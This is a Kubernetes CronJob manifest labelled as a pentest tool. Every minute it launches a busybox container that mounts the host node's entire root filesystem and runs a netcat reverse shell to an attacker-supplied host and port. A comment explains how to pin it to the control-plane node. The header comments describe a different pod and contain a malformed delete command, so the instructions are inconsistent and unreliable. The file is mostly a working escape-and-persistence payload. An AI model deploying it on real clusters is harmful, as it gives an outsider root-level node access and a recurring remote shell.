## Deploy: kubectl -n [namespace] apply -f hostpath-exec.yaml 
## Access: kubectl -n [namespace] exec -it hostpath-exec -- chroot /host
## Remove: kubectl -n [namespace] delete hostpath-exec
###########################################################

apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: hostpath-revshell-cronjob
  labels:
    app: pentest
spec:
  schedule: "*/1 * * * *"
  concurrencyPolicy: Forbid
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: hostpath-revshell-cronjob
            image: busybox
            volumeMounts:
            - mountPath: /host
              name: noderoot
            command: [ "/bin/sh", "-c", "--" ]
            args: [ "nc $HOST $PORT  -e /bin/sh;" ]
          #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
          volumes:
          - name: noderoot
            hostPath:
              path: /
          restartPolicy: OnFailure